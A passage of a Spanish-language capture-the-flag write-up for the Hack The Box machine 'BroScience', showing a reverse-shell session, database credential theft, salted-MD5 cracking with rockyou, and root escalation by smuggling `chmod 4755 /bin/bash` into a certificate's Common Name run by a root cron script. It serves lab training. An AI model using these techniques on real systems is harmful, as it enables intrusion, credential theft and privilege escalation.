+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.195.
+Ncat: Connection from 10.10.11.195:52948.
+bash: cannot set terminal process group (1247): Inappropriate ioctl for device  
+bash: no job control in this shell
+www-data@broscience:/var/www/html$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+www-data@broscience:/var/www/html$ ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+www-data@broscience:/var/www/html$ export TERM=xterm
+www-data@broscience:/var/www/html$ export SHELL=bash
+www-data@broscience:/var/www/html$ stty rows 50 columns 158
+</code></pre></div><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>Hay un usuario de sistema llamado <code>bill</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@broscience:/var/www/html$ ls /home  
+bill
+</code></pre></div><p>En el directorio raíz del servidor web, podemos encontrar credenciales para la base de datos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@broscience:/var/www/html$ cat includes/db_connect.php  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
+<span class="mtk1">$db_host </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"localhost"</span><span class="mtk1">;</span>
+<span class="mtk1">$db_port </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"5432"</span><span class="mtk1">;</span>
+<span class="mtk1">$db_name </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"broscience"</span><span class="mtk1">;</span>
+<span class="mtk1">$db_user </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"dbuser"</span><span class="mtk1">;</span>
+<span class="mtk1">$db_pass </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"RangeOfMotion%777"</span><span class="mtk1">;</span>
+<span class="mtk1">$db_salt </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"NaCl"</span><span class="mtk1">;</span>
+
+<span class="mtk1">$db_conn </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_connect</span><span class="mtk1">(</span><span class="mtk4">"host={</span><span class="mtk1">$db_host</span><span class="mtk4">} port={</span><span class="mtk1">$db_port</span><span class="mtk4">} dbname={</span><span class="mtk1">$db_name</span><span class="mtk4">} user={</span><span class="mtk1">$db_user</span><span class="mtk4">} password={</span><span class="mtk1">$db_pass</span><span class="mtk4">}"</span><span class="mtk1">);</span>  
+
+<span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">$db_conn) {</span>
+<span class="mtk1">    </span><span class="mtk5">die</span><span class="mtk1">(</span><span class="mtk4">"&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database"</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+<span class="mtk5">?</span><span class="mtk5">&gt;</span>
+</code></pre></div><p>Podemos conectarnos a la base de datos PostgreSQL y encontrar <em>hashes</em> de contraseñas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@broscience:/var/www/html$ cd /
+www-data@broscience:/$ psql -d broscience -U dbuser -W
+Password:
+psql (13.9 (Debian 13.9-0+deb11u1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+broscience=> \d
+                List of relations
+ Schema |       Name       |   Type   |  Owner
+--------+------------------+----------+----------
+ public | comments         | table    | postgres
+ public | comments_id_seq  | sequence | postgres
+ public | exercises        | table    | postgres
+ public | exercises_id_seq | sequence | postgres
+ public | users            | table    | postgres
+ public | users_id_seq     | sequence | postgres
+(6 rows)
+
+broscience=> select * from users;
+
+ id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created
+----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------  
+  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
+  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
+  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
+  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
+  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
+(5 rows)
+</code></pre></div><p>Desafortunadamente, ninguno de ellos se encuentra en <a href="https://crackstation.net">crackstation.net</a>:</p><p><img src="/images/HTB/BroScience/BroScience-20.png" alt="BroScience 20"></p><p>El problema es que los <em>hashes</em> tienen sal, que es <code>$db_salt = NaCl";</code> (aparece en <code>includes/db_connect.php</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">                                    $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_prepare</span><span class="mtk1">($db_conn, </span><span class="mtk4">"create_user_query"</span><span class="mtk1">, </span><span class="mtk4">'</span><span class="mtk5">INSERT INTO</span><span class="mtk4"> users (username, </span><span class="mtk5">password</span><span class="mtk4">, email, activation_code) </span><span class="mtk5">VALUES</span><span class="mtk4"> ($</span><span class="mtk6">1</span><span class="mtk4">, $</span><span class="mtk6">2</span><span class="mtk4">, $</span><span class="mtk6">3</span><span class="mtk4">, $</span><span class="mtk6">4</span><span class="mtk4">)</span><span class="mtk4">'</span><span class="mtk1">);</span>
+<span class="mtk1">                                    $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_execute</span><span class="mtk1">($db_conn, </span><span class="mtk4">"create_user_query"</span><span class="mtk1">, </span><span class="mtk7">array</span><span class="mtk1">($_POST[</span><span class="mtk4">'username'</span><span class="mtk1">], </span><span class="mtk7">md5</span><span class="mtk1">($db_salt </span><span class="mtk5">.</span><span class="mtk1"> $_POST[</span><span class="mtk4">'password'</span><span class="mtk1">]), $_POST[</span><span class="mtk4">'email'</span><span class="mtk1">], $activation_code));</span>  
+</code></pre></div><p>Para descifrar algunos <em>hashes</em>, podemos usar <code>rockyou.txt</code> con un ataque de fuerza bruta en PHP:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">cd</span> $WORDLISTS
+
+<span class="code-cyan">$</span> <span class="code-dark-green">php</span> -a
+Interactive shell
+
+php &gt; $db_salt = 'NaCl';
+php &gt;
+php &gt; $hashes = array(
+php (     '15657792073e8a843d4f91fc403454e1',
+php (     '13edad4932da9dbb57d9cd15b66ed104',
+php (     'bd3dad50e2d578ecba87d5fa15ca5f85',
+php (     'a7eed23a7be6fe0d765197b1027453fe',
+php (     '5d15340bded5b9395d5d14b9c21bc82b',
+php ( );
+php &gt;
+php &gt; if ($file = fopen('rockyou.txt', 'r')) {
+php {     while (!feof($file)) {
+php {         $password = fgets($file);
+php {
+php {         foreach ($hashes as $hash) {
+php {             if (md5($db_salt . trim($password)) === $hash) {  
+php {                 echo $hash . ' -&gt; ' . $password;
+php {                 break;
+php {             }
+php {         }
+php {     }
+php { }
+13edad4932da9dbb57d9cd15b66ed104 -&gt; iluvhorsesandgym
+5d15340bded5b9395d5d14b9c21bc82b -&gt; Aaronthehottest
+bd3dad50e2d578ecba87d5fa15ca5f85 -&gt; 2applesplus2apples
+</code></pre></div><p>Allí tenemos algunas contraseñas en texto claro. La contraseña para <code>bill</code> es <code>iluvhorsesandgym</code>, que se puede usar para acceder a través de SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> bill@10.10.11.195
+bill@10.10.11.195's password:
+<span class="code-green">bill@broscience</span>:<span class="code-blue">~</span>$ cat user.txt
+90ec21d6537e7cad84377c9c6b4b51c6  
+</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>En <code>/opt</code> podemos encontrar un <em>script</em> en Bash para renovar certificados de OpenSSL:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bill@broscience</span>:<span class="code-blue">/tmp</span>$ ls -l /opt
+total 4
+-rwxr-xr-x 1 root root 1806 Jul 14  2022 <span class="code-green">renew_cert.sh</span>  
+<span class="code-green">bill@broscience</span>:<span class="code-blue">/tmp</span>$ cat /opt/renew_cert.sh
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>
+
+<span class="mtk5">if</span><span class="mtk1"> [ </span><span class="mtk4">"</span><span class="mtk1">$#</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk5">-ne</span><span class="mtk1"> 1 ] </span><span class="mtk5">||</span><span class="mtk1"> [ $1 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"-h"</span><span class="mtk1"> ] </span><span class="mtk5">||</span><span class="mtk1"> [ $1 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"--help"</span><span class="mtk1"> ] </span><span class="mtk5">||</span><span class="mtk1"> [ $1 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"help"</span><span class="mtk1"> ]</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>
+<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Usage: </span><span class="mtk1">$0</span><span class="mtk4"> certificate.crt"</span><span class="mtk5">;</span>
+<span class="mtk1">    </span><span class="mtk7">exit</span><span class="mtk1"> 0</span><span class="mtk5">;</span>
+<span class="mtk5">fi</span>
+
+<span class="mtk5">if</span><span class="mtk1"> [ </span><span class="mtk5">-f</span><span class="mtk1"> $1 ]</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>
+
+<span class="mtk1">    openssl x509 -in $1 -noout -checkend 86400 </span><span class="mtk5">&gt;</span><span class="mtk1"> /dev/null</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> [ $? </span><span class="mtk5">-eq</span><span class="mtk1"> 0 ]</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>
+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"No need to renew yet."</span><span class="mtk5">;</span>
+<span class="mtk1">        </span><span class="mtk7">exit</span><span class="mtk1"> 1</span><span class="mtk5">;</span>
+<span class="mtk1">    </span><span class="mtk5">fi</span>
+
+<span class="mtk1">    subject=</span><span class="mtk4">$(openssl x509 -in </span><span class="mtk1">$1</span><span class="mtk4"> -noout -subject </span><span class="mtk5">|</span><span class="mtk4"> cut -d "=" -f2-)</span>
+
+<span class="mtk1">    country=</span><span class="mtk4">$(echo </span><span class="mtk1">$subject</span><span class="mtk4"> </span><span class="mtk5">|</span><span class="mtk4"> grep -Eo 'C = .{2}')</span>
+<span class="mtk1">    state=</span><span class="mtk4">$(echo </span><span class="mtk1">$subject</span><span class="mtk4"> </span><span class="mtk5">|</span><span class="mtk4"> grep -Eo 'ST = .*,')</span>
+<span class="mtk1">    locality=</span><span class="mtk4">$(echo </span><span class="mtk1">$subject</span><span class="mtk4"> </span><span class="mtk5">|</span><span class="mtk4"> grep -Eo 'L = .*,')</span>
+<span class="mtk1">    organization=</span><span class="mtk4">$(echo </span><span class="mtk1">$subject</span><span class="mtk4"> </span><span class="mtk5">|</span><span class="mtk4"> grep -Eo 'O = .*,')</span>
+<span class="mtk1">    organizationUnit=</span><span class="mtk4">$(echo </span><span class="mtk1">$subject</span><span class="mtk4"> </span><span class="mtk5">|</span><span class="mtk4"> grep -Eo 'OU = .*,')</span>
+<span class="mtk1">    commonName=</span><span class="mtk4">$(echo </span><span class="mtk1">$subject</span><span class="mtk4"> </span><span class="mtk5">|</span><span class="mtk4"> grep -Eo 'CN = .*,?')</span>
+<span class="mtk1">    emailAddress=</span><span class="mtk4">$(openssl x509 -in </span><span class="mtk1">$1</span><span class="mtk4"> -noout -email)</span>
+
+<span class="mtk1">    country=${country</span><span class="mtk5">:</span><span class="mtk1">4}</span>
+<span class="mtk1">    state=</span><span class="mtk4">$(echo </span><span class="mtk1">${state</span><span class="mtk5">:</span><span class="mtk1">5}</span><span class="mtk4"> </span><span class="mtk5">|</span><span class="mtk4"> awk -F, '{print $1}')</span>
+<span class="mtk1">    locality=</span><span class="mtk4">$(echo </span><span class="mtk1">${locality</span><span class="mtk5">:</span><span class="mtk1">3}</span><span class="mtk4"> </span><span class="mtk5">|</span><span class="mtk4"> awk -F, '{print $1}')</span>
+<span class="mtk1">    organization=</span><span class="mtk4">$(echo </span><span class="mtk1">${organization</span><span class="mtk5">:</span><span class="mtk1">4}</span><span class="mtk4"> </span><span class="mtk5">|</span><span class="mtk4"> awk -F, '{print $1}')</span>
+<span class="mtk1">    organizationUnit=</span><span class="mtk4">$(echo </span><span class="mtk1">${organizationUnit</span><span class="mtk5">:</span><span class="mtk1">5}</span><span class="mtk4"> </span><span class="mtk5">|</span><span class="mtk4"> awk -F, '{print $1}')</span>
+<span class="mtk1">    commonName=</span><span class="mtk4">$(echo </span><span class="mtk1">${commonName</span><span class="mtk5">:</span><span class="mtk1">5}</span><span class="mtk4"> </span><span class="mtk5">|</span><span class="mtk4"> awk -F, '{print $1}')</span>
+
+<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> $subject</span><span class="mtk5">;</span>
+<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk5">;</span>
+<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Country     =&gt; </span><span class="mtk1">$country</span><span class="mtk4">"</span><span class="mtk5">;</span>
+<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"State       =&gt; </span><span class="mtk1">$state</span><span class="mtk4">"</span><span class="mtk5">;</span>
+<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Locality    =&gt; </span><span class="mtk1">$locality</span><span class="mtk4">"</span><span class="mtk5">;</span>
+<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Org Name    =&gt; </span><span class="mtk1">$organization</span><span class="mtk4">"</span><span class="mtk5">;</span>
+<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Org Unit    =&gt; </span><span class="mtk1">$organizationUnit</span><span class="mtk4">"</span><span class="mtk5">;</span>
+<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Common Name =&gt; </span><span class="mtk1">$commonName</span><span class="mtk4">"</span><span class="mtk5">;</span>
+<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Email       =&gt; </span><span class="mtk1">$emailAddress</span><span class="mtk4">"</span><span class="mtk5">;</span>
+
+<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> -e </span><span class="mtk4">"\nGenerating certificate..."</span><span class="mtk5">;</span>
+<span class="mtk1">    openssl req -x509 -sha256 -nodes -newkey rsa:4</span><span class="mtk1">096 -keyout /tmp/temp.key -out /tmp/temp.crt -days</span><span class="mtk1"> 365 </span><span class="mtk5">&lt;&lt;&lt;</span><span class="mtk4">"$country</span>  
+<span class="mtk4">    $state</span>
+<span class="mtk4">    $locality</span>
+<span class="mtk4">    $organization</span>
+<span class="mtk4">    $organizationUnit</span>
+<span class="mtk4">    $commonName</span>
+<span class="mtk4">    $emailAddress</span>
+<span class="mtk4">    "</span><span class="mtk1"> </span><span class="mtk5">2&gt;</span><span class="mtk1">/dev/null</span>
+
+<span class="mtk1">    /bin/bash -c </span><span class="mtk4">"mv /tmp/temp.crt /home/bill/Certs/</span><span class="mtk1">$commonName</span><span class="mtk4">.crt"</span>
+<span class="mtk5">else</span>
+<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"File doesn't exist"</span>
+<span class="mtk1">    </span><span class="mtk7">exit</span><span class="mtk1"> 1</span><span class="mtk5">;</span>
+<span class="mtk5">fi</span>
+</code></pre></div><p>Si ejecutamos <a href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a>, veremos que el <em>script</em> anterior lo ejecuta <code>root</code> de manera periódica sobre <code>/home/bill/Certs/broscience.crt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bill@broscience</span>:<span class="code-blue">/tmp</span>$ wget -q 10.10.17.44/pspy64s
+<span class="code-green">bill@broscience</span>:<span class="code-blue">/tmp</span>$ chmod +x pspy64s
+<span class="code-green">bill@broscience</span>:<span class="code-blue">/tmp</span>$ ./pspy64s
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
+                   ░           ░ ░
+                               ░ ░
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)  
+Draining file system events due to startup...
+
+...
+
+<span class="code-blue">CMD: UID=0    PID=64575  | /usr/sbin/cron -f</span>
+<span class="code-blue">CMD: UID=0    PID=64580  | /bin/bash /root/cron.sh</span>
+<span class="code-blue">CMD: UID=0    PID=64579  | /bin/bash /root/webappreset.sh</span>
+<span class="code-blue">CMD: UID=0    PID=64578  | /bin/sh -c /root/cron.sh</span>
+<span class="code-blue">CMD: UID=0    PID=64577  | /bin/sh -c /root/webappreset.sh</span>
+<span class="code-blue">CMD: UID=0    PID=64582  | /bin/bash /root/cron.sh</span>
+<span class="code-blue">CMD: UID=0    PID=64581  | /usr/bin/rm -rf /var/www/html</span>
+<span class="code-blue">CMD: UID=0    PID=64583  | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt</span>
+<span class="code-blue">CMD: UID=0    PID=64589  | /usr/sbin/apache2 -k start</span>
+
+...
+</code></pre></div><h3 id="inyección-de-comandos">Inyección de comandos</h3><p>Hay una vulnerabilidad de inyección de comandos en el <em>script</em> anterior:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    /bin/bash -c </span><span class="mtk4">"mv /tmp/temp.crt /home/bill/Certs/</span><span class="mtk1">$commonName</span><span class="mtk4">.crt"</span>  
+</code></pre></div><p>Si entramos <code>`whoami`</code> como el campo <em>Common Name</em> del certificado, la salida del comando se utilizará para establecer el nombre del archivo del certificado. Por ejemplo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bill@broscience</span>:<span class="code-blue">~</span>$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out Certs/broscience.crt -days 1
+Generating a RSA private key
+.............................++++
+...........................................................................................................................................++++  
+writing new private key to '/tmp/temp.key'
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:`whoami`
+Email Address []:
+<span class="code-green">bill@broscience</span>:<span class="code-blue">~</span>$ /opt/renew_cert.sh Certs/broscience.crt
+C = AU, ST = Some-State, O = Internet Widgits Pty Ltd, CN = `whoami`
+
+Country     =&gt; AU
+State       =&gt; Some-State
+Locality    =&gt;
+Org Name    =&gt; Internet Widgits Pty Ltd
+Org Unit    =&gt;
+Common Name =&gt; `whoami`
+Email       =&gt;
+
+Generating certificate...
+<span class="code-green">bill@broscience</span>:<span class="code-blue">~</span>$ ls -l Certs/
+total 8
+-rw-r--r-- 1 bill bill 2163 Jan 22 13:28 bill.crt
+-rw-r--r-- 1 bill bill 1992 Jan 22 13:28 broscience.crt
+</code></pre></div><p>Nótese que <code>bill</code> es la salida del comando <code>whoami</code>.</p><p>En este punto, podemos crear un certificado en <code>/home/bill/Certs/broscience.crt</code> con <code>`chmod 4755 /bin/bash`</code> como <em>Common Name</em>, de modo que <code>root</code> transforma Bash en un binario SUID:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bill@broscience</span>:<span class="code-blue">~</span>$ ls -l /bin/bash
+-rwxr-xr-x 1 root root 1234376 Mar 27  2022 <span class="code-green">/bin/bash</span>
+<span class="code-green">bill@broscience</span>:<span class="code-blue">~</span>$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out Certs/broscience.crt -days 1  
+Generating a RSA private key
+.......................................................................................................................++++
+..................................++++
+writing new private key to '/tmp/temp.key'
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:`chmod 4755 /bin/bash`
+Email Address []:
+<span class="code-green">bill@broscience</span>:<span class="code-blue">~</span>$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 <span class="code-white code-bg-red">/bin/bash</span>
+</code></pre></div><p>Ahí está, ahora tenemos una <em>shell</em> como <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bill@broscience</span>:<span class="code-blue">~</span>$ bash -p
+bash-5.1# cat /root/root.txt
+cdd87f274a69fb807e325e072dd99ffd  
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#análisis-de-código-fuente">Análisis de código fuente</a></li><li><a href="#activando-la-cuenta">Activando la cuenta</a></li><li><a href="#ataque-de-deserialización">Ataque de deserialización</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#inyección-de-comandos">Inyección de comandos</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
+<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 